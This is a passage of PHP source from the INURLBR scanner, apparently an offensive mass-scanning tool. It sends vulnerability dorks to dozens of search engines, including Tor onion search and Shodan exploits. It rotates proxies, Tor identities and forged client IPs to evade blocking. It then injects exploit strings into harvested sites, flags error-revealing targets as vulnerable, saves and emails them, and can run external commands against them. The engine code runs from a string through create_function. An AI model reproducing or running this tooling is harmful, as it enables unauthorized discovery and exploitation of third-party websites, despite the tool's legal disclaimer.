    echo (!is_null($_SESSION['config']['max_pag']) ? ("\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ LIMIT PAG ]::{$_SESSION["c1"]}[ {$_SESSION["c4"]}{$_SESSION['config']['max_pag']}{$_SESSION["c1"]} ]{$_SESSION["c0"]}\n") : NULL);
    $http_proxy = not_isnull_empty($_SESSION['config']['proxy-http-file']) || not_isnull_empty($_SESSION['config']['proxy-http']) ? __proxyHttpRandom() : NULL;
    echo not_isnull_empty($http_proxy) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ HTTP_PROXY ]:: {$http_proxy}{$_SESSION["c0"]}\n" : NULL;
    echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ SEARCHING ]:: {$_SESSION["c0"]}\n";

    $contMaxpg = 0;
    $pagStart2_ = $pagStart2;
    $pagStart3_ = $pagStart2;
    while ($pagStart <= $pagLimit) {

        echo "{$_SESSION["c1"]}-{$_SESSION["c16"]}[{$_SESSION["c12"]}:::{$_SESSION["c16"]}]{$_SESSION["c0"]}";
        __plus();
        $_proxy = not_isnull_empty($confArray["list_proxy_rand"]) && !not_isnull_empty($_SESSION['config']['time-proxy']) ? $confArray["list_proxy_rand"] : $_SESSION["config"]["proxy"];
        $proxy = not_isnull_empty($_SESSION['config']['proxy-file']) && not_isnull_empty($_SESSION['config']['time-proxy']) ? __timeSecChangeProxy($confArray["list_proxy_file"]) : $_proxy;

        $mountURL_ = str_replace("[DORK]", $dork, $motorURL);
        $mountURL_ = str_replace("[PAG]", $pagStart, $mountURL_);
        $mountURL_ = str_replace("[PAG2]", $pagStart2_, $mountURL_);
        $mountURL_ = str_replace("[PAG3]", $pagStart3_, $mountURL_);
        $mountURL_ = str_replace("[RANDOM]", base64_encode(intval(rand() % 255) . intval(rand() % 2553333)), $mountURL_);
        $mountURL_ = str_replace("[IP]", intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255) . "." . intval(rand() % 255), $mountURL_);


        $postDados = !is_null($postDados) ? __convertUrlQuery(parse_url(urldecode($mountURL_), PHP_URL_QUERY)) : NULL;

        __debug(array('debug' => "[ URL ENGINE ]{$http_proxy}{$mountURL_}", 'function' => '__pageEngine'), 1);

        $request__ = __request_info($curlObject = curl_init(), $http_proxy . $mountURL_, $proxy, $postDados);
        __plus();
        __subProcess(__filterURL($request__["corpo"], $motorNome));
        __plus();

        $pagStart = ($pagStart + $pagIncrement);
        $pagStart2_ = ($pagStart2_ + $pagIncrement);
        $pagStart3_ = ($pagStart3_ + $pagIncrement2);
        $contMaxpg++;
        __timeSec('delay');

        if (!is_null($_SESSION['config']['max_pag']) && $_SESSION['config']['max_pag'] == $contMaxpg) {

            break;
        }
    }
}

################################################################################
#SUB PROCESS INJECT VALUES######################################################

function __subExecExploits($target, $exploitArray = array()) {
    echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
    echo "         |[ SUB PROCESS ]::\n";
    $target = __filterHostname($target);

    foreach ($exploitArray as $value) {
        $postDados = !is_null($_SESSION["config"]["sub-post"]) ? __convertUrlQuery($value) : NULL;
        $url = "{$target}{$value}";
        echo "{$_SESSION["c7"]}-[|||]{$_SESSION["c0"]}";
        $resultado__ = __request_info($curl = curl_init(), $url, $_SESSION["config"]["proxy"], $postDados);
        __plus();
        $_ex['erroReturn'] = __checkError($resultado__['corpo']);
        __plus();
        $_ex['vull_style'] = (not_isnull_empty($_ex['erroReturn'])) ? "{$_SESSION["c15"]}[ INFO ][{$_ex['erroReturn']} ]\n[ INFO ][ TARGET POTENTIALLY VULNERABLE ]: " . __cli_beep() : NULL;
        echo (not_isnull_empty($_ex['erroReturn']) ? "\n{$_ex['vull_style']}{$url}\n{$_SESSION["c0"]}" : NULL);
        (not_isnull_empty($_ex['erroReturn']) ? __saveValue($_SESSION['config']['arquivo_output'], $url, 1) : NULL);
        __plus();
        __timeSec('delay');
    }
    unset($_ex);
}

################################################################################
#SEND VALUES EMAIL##############################################################

function __sendMail($email, $value) {

    $headers = NULL;
    $headers .= "From: <scanner-inurlbr@localhost>\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
    $headers .= "content-type: text/html\nX-priority: 1\n";
    $body = "------------------------------------------------------\n";
    $body.="DATE:  [" . date("d-m-Y H:i:s") . "]";
    $body.=not_isnull_empty($_SESSION['config']['http-header']) ? "HTTP HEADER: {$_SESSION['config']['http-header']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['motor']) ? "MOTOR BUSCA: {$_SESSION['config']['motor']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['tipoerro']) ? "TIPO ERROR: {$_SESSION['config']['tipoerro']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['exploit-get']) ? "EXPLOIT GET: {$_SESSION['config']['exploit-get']}\n" : NULL;
    if (not_isnull_empty($_SESSION['config']['exploit-post'])) {
        foreach ($_SESSION['config']['exploit-post'] as $key => $_v) {
            $post.="{$key}: $_v";
            __plus();
        }
        $body.=not_isnull_empty($post) ? "EXPLOIT-POST: {$post}\n" : NULL;
    }
    $body.=not_isnull_empty($_SESSION['config']['command-vul']) ? "COMMAND VUL: {$_SESSION['config']['command-vul']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['command-all']) ? "COMMAND ALL: {$_SESSION['config']['command-all']}\n" : NULL;
    $body.=not_isnull_empty($_SESSION['config']['user-agent']) ? "USER AGENT: {$_SESSION['config']['user-agent']}\n" : NULL;
    $body.= "------------------------------------------------------\n";

    if (mail($email, "[ INFO ][ OUTPUT INURLBR ]:: {$value}", $body, $headers)) {
        __plus();
        return "[ INFO ][ SUBMITTED SUCCESSFULLY ]\n";
    } else {
        __plus();
        return "[ INFO ][ NOT SENT ]\n";
    }
}

################################################################################
#HOST GOOGLE RANDOM#############################################################

function __dominioGoogleRandom() {
    $_SESSION["random"]['dominio_google'] = array(
        'www.google.com', 'www.google.ac', 'www.google.com.om',
        'www.google.ad', 'www.google.ae', 'www.google.com.af',
        'www.google.com.ag', 'www.google.com.ai', 'www.google.am',
        'www.google.it.ao', 'www.google.com.ar', 'www.google.cat',
        'www.google.as', 'www.google.at', 'www.google.com.au',
        'www.google.az', 'www.google.ba', 'www.google.com.bd',
        'www.google.be', 'www.google.bf', 'www.google.bg',
        'www.google.com.bh', 'www.google.bi', 'www.google.bj',
        'www.google.com.bn', 'www.google.com.bo', 'www.google.com.br',
        'www.google.bs', 'www.google.co.bw', 'www.google.com.by',
        'www.google.com.bz', 'www.google.ca', 'www.google.com.kh',
        'www.google.cc', 'www.google.cd', 'www.google.cf',
        'www.google.cn', 'www.google.com.co', 'www.google.co.nz',
        'www.google.cg', 'www.google.ch', 'www.google.ci',
        'www.google.co.ck', 'www.google.cl', 'www.google.cm',
        'www.google.co.cr', 'www.google.com.cu', 'www.google.cv',
        'www.google.cz', 'www.google.de', 'www.google.nu',
        'www.google.dj', 'www.google.dk', 'www.google.dm',
        'www.google.com.do', 'www.google.dz', 'www.google.no',
        'www.google.com.ec', 'www.google.ee', 'www.google.com.eg',
        'www.google.es', 'www.google.com.et', 'www.google.com.np',
        'www.google.fi', 'www.google.com.fj', 'www.google.fm',
        'www.google.fr', 'www.google.ga', 'www.google.nl',
        'www.google.ge', 'www.google.gf', 'www.google.gg',
        'www.google.com.gh', 'www.google.com.gi', 'www.google.nr',
        'www.google.gl', 'www.google.gm', 'www.google.gp',
        'www.google.gr', 'www.google.com.gt', 'www.google.com.ni',
        'www.google.gy', 'www.google.com.hk', 'www.google.hn',
        'www.google.hr', 'www.google.ht', 'www.google.com.ng',
        'www.google.hu', 'www.google.co.id', 'www.google.iq',
        'www.google.ie', 'www.google.co.il', 'www.google.com.nf',
        'www.google.im', 'www.google.co.in', 'www.google.io',
        'www.google.is', 'www.google.it', 'www.google.ne',
        'www.google.je', 'www.google.com.jm', 'www.google.jo',
        'www.google.co.jp', 'www.google.co.ke', 'www.google.com.na',
        'www.google.ki', 'www.google.kg', 'www.google.co.kr',
        'www.google.com.kw', 'www.google.kz', 'www.google.co.mz',
        'www.google.la', 'www.google.com.lb', 'www.google.com.lc',
        'www.google.li', 'www.google.lk', 'www.google.com.my',
        'www.google.co.ls', 'www.google.lt', 'www.google.lu',
        'www.google.lv', 'www.google.com.ly', 'www.google.com.mx',
        'www.google.co.ma', 'www.google.md', 'www.google.me',
        'www.google.mg', 'www.google.mk', 'www.google.mw',
        'www.google.ml', 'www.google.mn', 'www.google.ms',
        'www.google.com.mt', 'www.google.mu', 'www.google.mv',
        'www.google.com.pa', 'www.google.com.pe', 'www.google.com.ph',
        'www.google.com.pk', 'www.google.pn', 'www.google.com.pr',
        'www.google.ps', 'www.google.pt', 'www.google.com.py',
        'www.google.com.qa', 'www.google.ro', 'www.google.rs',
        'www.google.ru', 'www.google.rw', 'www.google.com.sa',
        'www.google.com.sb', 'www.google.sc', 'www.google.se',
        'www.google.com.sg', 'www.google.sh', 'www.google.si',
        'www.google.sk', 'www.google.com.sl', 'www.google.sn',
        'www.google.sm', 'www.google.so', 'www.google.st',
        'www.google.com.sv', 'www.google.td', 'www.google.tg',
        'www.google.co.th', 'www.google.tk', 'www.google.tl',
        'www.google.tm', 'www.google.to', 'www.google.com.tn',
        'www.google.com.tr', 'www.google.tt', 'www.google.com.tw',
        'www.google.co.tz', 'www.google.com.ua', 'www.google.co.ug',
        'www.google.co.uk', 'www.google.us', 'www.google.com.uy',
        'www.google.co.uz', 'www.google.com.vc', 'www.google.co.ve',
        'www.google.vg', 'www.google.co.vi', 'www.google.com.vn',
        'www.google.vu', 'www.google.ws', 'www.google.co.za',
        'www.google.co.zm', 'www.google.co.zw'
    );

    return $_SESSION["random"]['dominio_google'][rand(0, count($_SESSION["random"]['dominio_google']) - 1)];
}

################################################################################
#(CSE)-GOOGLE Custom Search Engine ID RANDOM####################################

function __googleGenericRandom() {
    $generic = array(
        '013269018370076798483:wdba3dlnxqm',
        '005911257635119896548:iiolgmwf2se',
        '007843865286850066037:b0heuatvay8',
        '002901626849897788481:cpnctza84gq',
        '006748068166572874491:55ez0c3j3ey',
        '012984904789461885316:oy3-mu17hxk',
        '006688160405527839966:yhpefuwybre',
        '003917828085772992913:gmoeray5sa8',
        '007843865286850066037:3ajwn2jlweq',
        '010479943387663786936:wjwf2xkhfmq',
        '012873187529719969291:yexdhbzntue'
    );
    return $generic[rand(0, count($generic) - 1)];
}

################################################################################
#PROXY HTTP BASE FILE###########################################################

function __proxyHttpRandom() {
    $proxy_file = (file_exists($_SESSION['config']['proxy-http-file']) ? __openFile($_SESSION['config']['proxy-http-file'], 1) : array());
    $proxy_ = is_array($proxy_file) ? array_merge($_SESSION['config']['proxy-http'], $proxy_file) : $_SESSION['config']['proxy-http'];
    return $proxy_[rand(0, count($proxy_) - 1)];
}

function __filterDomainUnique($resultados) {

    if (is_array($resultados)) {

        foreach ($resultados as $value) {

            $temp[] = "http://" . __filterHostname($value);
        }

        return array_unique(array_filter($temp));
    }

    RETURN FALSE;
}

################################################################################
#CODE SEARCH ENGINES############################################################
$_SESSION['config']['cod'] = ' 
    
$dork_ = (not_isnull_empty($dork__)) ? $dork__ : __getOut("DEFINA SUA DORK\n");
$list_proxy_ = (!is_null($list_proxy) ? $list_proxy[rand(0, count($list_proxy) - 1)] : NULL);
$confArray["list_proxy_rand"] = $list_proxy_;
$confArray["list_proxy_file"] = $list_proxy;
(!is_null($_SESSION["config"]["tor-random"]) && !is_null($_SESSION["config"]["proxy"]) ? __renewTOR() : NULL);
echo "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ SEARCHING ]:: {$_SESSION["c1"]}{{$_SESSION["c0"]} ";

__plus();

echo (!is_null($list_proxy_) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ PROXY FILE RANDOM ]:: {$_SESSION["c1"]}[ {$list_proxy_} ]{$_SESSION["c0"]} " : NULL );

################################################################################
# SEARCH ENGINE :::  google
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], "all")) {

$randHost = __dominioGoogleRandom();
__pageEngine($confArray, "GOOGLE - {$randHost}", "https://{$randHost}/search?q=[DORK]&num=1500&btnG=Search&pws=1",$dork_,$postDados, 0, 0, 1);
}


################################################################################
# SEARCH ENGINE :::  bing
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 2) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "BING", "http://www.bing.com/search?q=[DORK]&&filt=rf&first=[PAG]",$dork_,$postDados, 1, 991, 50);
}

################################################################################
# SEARCH ENGINE :::  yahoo
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 3) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "YAHOO BR", "http://search.yahoo.com/search?p=[DORK]&ei=UTF-8&b=[PAG]",$dork_,$postDados, 1, 471, 10);
}

################################################################################
# SEARCH ENGINE :::  ask
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 4) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray,"ASK", "http://www.ask.com/web?q=[DORK]&page=[PAG]&qid=[RANDOM]",$dork_,$postDados, 0, 16, 1);
}

################################################################################
# SEARCH ENGINE :::  hao123
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 5) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "HAO123 BR", "http://search.hao123.com.br/s?tn=[RANDOM]&f=0&wd=[DORK]&haobd=[RANDOM]FG=1&ie=utf-8&pn=[PAG]&showTop=0",$dork_,$postDados, 0, 550, 10);
}

################################################################################
# SEARCH ENGINE :::  googleapis 
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], 6) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "GOOGLE API", "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&rsz=8&q=[DORK]&start=[PAG]&userip=[IP]&filter=1&safe=off",$dork_,$postDados, 0, 56, 4);
}

################################################################################
# SEARCH ENGINE :::  lycos
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 7) || __validateOptions($_SESSION["config"]["motor"], "all")) {
$_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos(__request_info($curlObject_id = curl_init(), "http://search.lycos.com", $_SESSION["config"]["proxy"], $postDados)["corpo"]);

__pageEngine($confArray,"LYCOS", "http://search.lycos.com/web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}&pn=[PAG]",$dork_,$postDados, 0, 24, 1);
}

################################################################################
# SEARCH ENGINE :::  uol.com.br
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 8) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "UOL BR", "http://busca.uol.com.br/web/?q=[DORK]&start=[PAG]",$dork_,$postDados, 10, 130, 10);
}

################################################################################
# SEARCH ENGINE :::  us.yhs4.search.yahoo
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 9) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "YAHOO US", "http://us.yhs4.search.yahoo.com/yhs/search?p=[DORK]&fr=goodsearch-yhsif&b=[PAG]",$dork_,$postDados, 1, 551, 10);
}

################################################################################
# SEARCH ENGINE :::  sapo.pt
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 10) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "SAPO", "http://pesquisa.sapo.pt/?adultfilter=strict&barra=resumo&cluster=0&format=html&limit=10&location=pt&page=[PAG]&q=[DORK]&st=web",$dork_,$postDados, 0, 14, 1);
}

################################################################################
# SEARCH ENGINE :::  dmoz
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 11) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "DMOZ", "http://www.dmoz.org/search/search?q=[DORK]&start=[PAG]&type=next&all=yes&cat=",$dork_,$postDados, 0, 800, 20);
}

################################################################################
# SEARCH ENGINE :::  gigablast
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 12) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "GIGABLAST", "http://www.gigablast.com/search?k3h=223119&s=22&rat=0&sc=1&ns=100&n=100&sites=&q=[DORK]",$dork_,$postDados, 0, 1, 1);
}

################################################################################
# SEARCH ENGINE :::  web.search.naver.com
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 13) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "NEVER", "http://web.search.naver.com/search.naver?where=webkr&query=[DORK]&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=[PAG]",$dork_,$postDados, 1, 500, 10);
}

################################################################################
# SEARCH ENGINE :::  br.baidu.com
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 14) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "BAIDU BR", "http://www.baidu.com.br/s?usm=1&rn=100&wd=[DORK]&ie=utf-8&pn=[PAG]&showTop=0",$dork_,$postDados, 0, 1500, 100);
}

################################################################################
# SEARCH ENGINE :::  www.yandex.ru
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 15) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "YANDEX", "http://yandex.ru/yandsearch?text=[DORK]&p=[PAG]&lr=10136",$dork_,$postDados, 0, 30, 1);
}

################################################################################
# SEARCH ENGINE :::  www.zoo.com
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 16) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "ZOO", "http://www.zoo.com/Zoo-Site/search/web?qsi=[PAG2]&q=[DORK]&p=[PAG]&fcoid=4&fpid=2",$dork_,$postDados, 1, 211, 20, 10);
}

################################################################################
# SEARCH ENGINE :::  www.hotbot.com
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 17) || __validateOptions($_SESSION["config"]["motor"], "all")) {

$_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos(__request_info($curlObject_id = curl_init(), "http://www.hotbot.com/", $_SESSION["config"]["proxy"], $postDados)["corpo"]);
__pageEngine($confArray, "HOTBOT", "http://www.hotbot.com/search/web?pn=[PAG]web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}",$dork_,$postDados, 0, 24, 1);
}

################################################################################
# SEARCH ENGINE :::  www.zhongsou.com
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 18) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "ZHONGSOU", "http://www.zhongsou.com/third?w=[DORK]&b=[PAG]",$dork_,$postDados, 1, 50, 1);
}

################################################################################
# SEARCH ENGINE :::  hksearch.timway.com
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 19) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "HKSEARCH", "http://hksearch.timway.com/search.php?query=[DORK]&region=zh-hant-hk&p=[PAG]",$dork_,$postDados, 1, 12, 1);
}

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / USA
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "EZILION USA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=usa&f=",$dork_,$postDados, 0, 215, 15);
}

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / ASIA
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "EZILION ASIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=asia&f=",$dork_,$postDados, 0, 215, 15);
}

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / EUROPA
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "EZILION EUROPA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=eu&f=",$dork_,$postDados, 0, 215, 15);
}

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / INDIA
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "EZILION INDIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=in&f=",$dork_,$postDados, 0, 215, 15);
}

################################################################################
# SEARCH ENGINE :::  www.sogou.com
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], 21) || __validateOptions($_SESSION["config"]["motor"], "all")) {

__pageEngine($confArray, "SOGOU", "http://www.sogou.com/web?query=[DORK]&page=[pag]&ie=utf8",$dork_,$postDados, 1, 20, 1);
}

################################################################################
# SEARCH ENGINE :::  api.duckduckgo.com
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], "22") || __validateOptions($_SESSION["config"]["motor"], "all")) {

$postDados = TRUE;
__pageEngine($confArray, "DUCK DUCK GO", "https://api.duckduckgo.com/html/?q=[DORK]&kl=en-us&p=-1&s=[PAG]&dc=[PAG3]&o=json&api=d.js",$dork_,$postDados, 0, 800, 50, 0, 37);
}

################################################################################
# SEARCH ENGINE :::  boorow
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], "23") || __validateOptions($_SESSION["config"]["motor"], "all")) {

$postDados = TRUE;
__pageEngine($confArray, "BOOROW", "http://boorow.com/Pages/site_br_aspx?query=[DORK]",$dork_,$postDados, 0, 0, 1);
}

################################################################################
# SEARCH ENGINE ::: Google Generic RANDOM
################################################################################
if (__validateOptions($_SESSION["config"]["motor"], "24") || __validateOptions($_SESSION["config"]["motor"], 1) ||  __validateOptions($_SESSION["config"]["motor"], "all")) {

$randHost = __dominioGoogleRandom();
$randGeneric = __googleGenericRandom();
__pageEngine($confArray, "GOOGLE_GENERIC_RANDOM - {$randHost} ID: {$randGeneric}", "http://{$randHost}/cse?cx={$randGeneric}&q=[DORK]&num=500&hl=en&as_qdr=all&start=[PAG]&sa=N",$dork_,$postDados, 0, 5, 1);

}


#===============================================================================
#===============================================================================
#===============================================================================
#======================[ MOTORES DE BUSCA ESPECIAIS  ]==========================
#===============================================================================
#===============================================================================
#===============================================================================

#===============================================================================
# SEARCH ENGINE :::  ndj6p3asftxboa7j.tor2web.org / Tor find
#===============================================================================
if (__validateOptions($_SESSION["config"]["motor"], "e1")) {

__pageEngine("TOR FIND", "https://ndj6p3asftxboa7j.tor2web.org/search.php?search_query=[DORK]&page_num=[PAG]&domainchoice=onion",$dork_,$postDados, 1, 5, 1);
}

#===============================================================================
# SEARCH ENGINE :::  elephantjmjqepsw.tor2web.org
#===============================================================================
if (__validateOptions($_SESSION["config"]["motor"], "e2")) {

__pageEngine("ELEPHANT", "https://elephantjmjqepsw.tor2web.orgsearch?q=[DORK]&page=[PAG]",$dork_,$postDados, 0, 29, 1);
}

#===============================================================================
# SEARCH ENGINE :::  kbhpodhnfxl3clb4.tor2web.org
#===============================================================================
if (__validateOptions($_SESSION["config"]["motor"], "e3")) {

__pageEngine("TORSEARCH", "https://kbhpodhnfxl3clb4.tor2web.org/en/search?j=f&page=[PAG]&q=[DORK]&utf8=%E2%9C%93",$dork_,$postDados, 0, 10, 1);
}

#===============================================================================
# SEARCH ENGINE :::  search.wikileaks.org
#===============================================================================
if (__validateOptions($_SESSION["config"]["motor"], "e4")) {

__pageEngine("WIKILEAKS", "https://search.wikileaks.org/?page=[PAG]&q=[DORK]&sort=0#results",$dork_,$postDados, 1, 60, 1);
}

#===============================================================================
# SEARCH ENGINE ::: oth.net
#===============================================================================
if (__validateOptions($_SESSION["config"]["motor"], "e5")) {

__pageEngine("OTN", "http://oth.net/s/s?q=[DORK]&cl=1&skip=[PAG]",$dork_,$postDados, 1, 211, 20);
}

#===============================================================================
# SEARCH ENGINE ::: exploits.shodan.io
#===============================================================================
if (__validateOptions($_SESSION["config"]["motor"], "e6")) {

__pageEngine("EXPLOITS SHODAN", "https://exploits.shodan.io/?q=[DORK]&p=[PAG]",$dork_,$postDados, 1, 25, 1);
}


__plus(); ';

################################################################################
#INITIAL INFORMATION############################################################

function __startingBanner() {

    echo "\n{$_SESSION["c1"]}[ ! ] Starting SCANNER INURLBR 2.0 at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c9"]}
[!] legal disclaimer: Usage of INURLBR for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program{$_SESSION["c0"]}\n";

    $file = not_isnull_empty($_SESSION['config']['arquivo_output']) ? $_SESSION['config']['arquivo_output'] : NULL;
    $file_all = not_isnull_empty($_SESSION['config']['arquivo_output_all']) ? $_SESSION['config']['arquivo_output_all'] : NULL;
    $command = not_isnull_empty($_SESSION['config']['command-vul']) ? $_SESSION['config']['command-vul'] : $_SESSION['config']['command-all'];

    echo (not_isnull_empty($_SESSION['config']['ifurl']) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILTRE URL ]::{$_SESSION["c1"]}[ {$_SESSION['config']['ifurl']} ]{$_SESSION["c0"]}" : NULL);
    echo (not_isnull_empty($file) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL);
    echo (not_isnull_empty($file_all) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]}[ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL);
    echo (not_isnull_empty($command) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DEFINED EXTERNAL COMMAND ]::{$_SESSION["c1"]} [ $command ]{$_SESSION["c0"]}" : NULL);
    echo (not_isnull_empty($_SESSION['config']['proxy-file']) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILE SOURCE LIST OF PROXY ]::{$_SESSION["c1"]} [ {$_SESSION['config']['proxy-file']} ]{$_SESSION["c0"]}" : NULL);
}

################################################################################
#RUN WITH SEARCH ENGINES########################################################

function __main($dork, $motor, $cod) {

    $dork_ = (strstr($dork, '[DORK]') ? explode('[DORK]', $dork) : array($dork)); // MULTIPLAS DORKS
    $file_dork = (not_isnull_empty($_SESSION['config']['dork-file']) ? __openFile($_SESSION['config']['dork-file'], 1) : $dork_);
    $dork__ = array_filter(array_unique(array_merge($file_dork, $dork_)));
    $file_proxy = (not_isnull_empty($_SESSION['config']['proxy-file']) ? __openFile($_SESSION['config']['proxy-file'], 1) : NULL);
    $list_proxy = (is_array($file_proxy) ? ($file_proxy) : NULL);

    print __bannerLogo();

    __startingBanner();

    for ($i = 0; $i <= count($dork__); $i++) {

        if (!empty($dork__[$i])) {

            echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ DORK ]::{$_SESSION["c1"]}[ {$dork__[$i]} ]\n";

            $objNewSearch = create_function('$dork__, $motor, $list_proxy', $cod);
            $objNewSearch(urlencode($dork__[$i]), $motor, $list_proxy);

            __plus();
            echo "\n";
        }
    }

    __process(explode("\n", $_SESSION["config"]["totas_urls"])) . __plus();

    __exitProcess();
}

################################################################################
#RUN VALIDATION / PROCESSES WITH FILE###########################################
if (not_isnull_empty($_SESSION['config']['abrir-arquivo'])) {

    print __bannerLogo();
    __startingBanner();
    __openFile($_SESSION['config']['abrir-arquivo']);
    __plus();
    __exitProcess();
}

################################################################################
#RUN WITH SEARCH ENGINES########################################################
__main($_SESSION['config']['dork'], $_SESSION['config']['motor'], $_SESSION['config']['cod']);

function __extra() {

    $banners = array(
        "{$_SESSION["c1"]}
_ _  _ _  _ ____ _    ___  ____ 
| |\ | |  | |__/ |    |__] |__/ 
| | \| |__| |  \ |___ |__] |  \ 
", "{$_SESSION["c1"]}
 (        )         (    (          (     
 )\ )  ( /(         )\ ) )\ )   (   )\ )  
(()/(  )\())    (  (()/((()/( ( )\ (()/(  
 /(_))((_)\     )\  /(_))/(_)))((_) /(_)) 
(_))   _((_) _ ((_)(_)) (_)) ((_)_ (_))   
|_ _| | \| || | | || _ \| |   | _ )| _ \  
 | |  | .` || |_| ||   /| |__ | _ \|   /  
|___| |_|\_| \___/ |_|_\|____||___/|_|_\ 
 ", "{$_SESSION["c1"]}
.-..-. .-..-. .-..----. .-.   .----. .----. 
| ||  `| || { } || {}  }| |   | {}  }| {}  }
| || |\  || {_} || .-. \| `--.| {}  }| .-. \
`-'`-' `-'`-----'`-' `-'`----'`----' `-' `-' 
     ", "{$_SESSION["c1"]}
 ___ _   _ _   _ ____  _     ____  ____  
|_ _| \ | | | | |  _ \| |   | __ )|  _ \ 
 | ||  \| | | | | |_) | |   |  _ \| |_) |
 | || |\  | |_| |  _ <| |___| |_) |  _ < 
|___|_| \_|\___/|_| \_\_____|____/|_| \_\
", "{$_SESSION["c1"]}
                                     /~\
                                    |oo )      /INURLBR
                                    _\=/_
                    ___        #   /  _  \   #
                   /() \        \\//|/.\|\\//
                 _|_____|_       \/  \_/  \/
                | | === | |         |\ /|
                |_|  O  |_|         \_ _/
                 ||  O  ||          | | |
                 ||__*__||          | | |
